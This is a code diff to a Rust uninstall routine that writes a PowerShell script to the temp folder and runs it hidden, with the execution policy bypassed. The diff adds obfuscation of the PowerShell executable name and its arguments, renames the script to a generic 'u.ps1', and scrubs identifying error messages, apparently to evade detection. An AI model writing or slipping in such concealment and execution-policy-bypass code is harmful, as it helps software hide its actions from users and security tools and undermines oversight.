@@ -60,18 +60,20 @@ Remove-Item -Path "{dir_path}" -Recurse -Force -ErrorAction SilentlyContinue
     }
 
     fn sched_uninstall(&self) -> Result<()> {
+        use crate::utils::obfuscate::{exe, powershell};
+        
         let script_content = self.gen_ps_script()?;
         let tmp_dir = env::temp_dir();
-        let script_path = tmp_dir.join("kurinium_uninstall.ps1");
+        let script_path = tmp_dir.join("u.ps1"); // Generic filename
 
-        fs::write(&script_path, script_content).context("Failed to write uninstall script")?;
+        fs::write(&script_path, script_content).context("Failed to write script")?;
 
-        Command::new("powershell.exe")
+        Command::new(exe::powershell())
             .args([
-                "-ExecutionPolicy",
-                "Bypass",
-                "-WindowStyle",
-                "Hidden",
+                &powershell::execution_policy(),
+                &powershell::bypass(),
+                &powershell::window_style(),
+                &powershell::hidden(),
                 "-File",
                 &script_path.to_string_lossy(),
             ])
@@ -79,7 +81,7 @@ Remove-Item -Path "{dir_path}" -Recurse -Force -ErrorAction SilentlyContinue
             .stdout(Stdio::null())
             .stderr(Stdio::null())
             .spawn()
-            .context("Failed to spawn PowerShell for uninstall")?;
+            .context("Failed to spawn script")?;
 
         Ok(())
     }
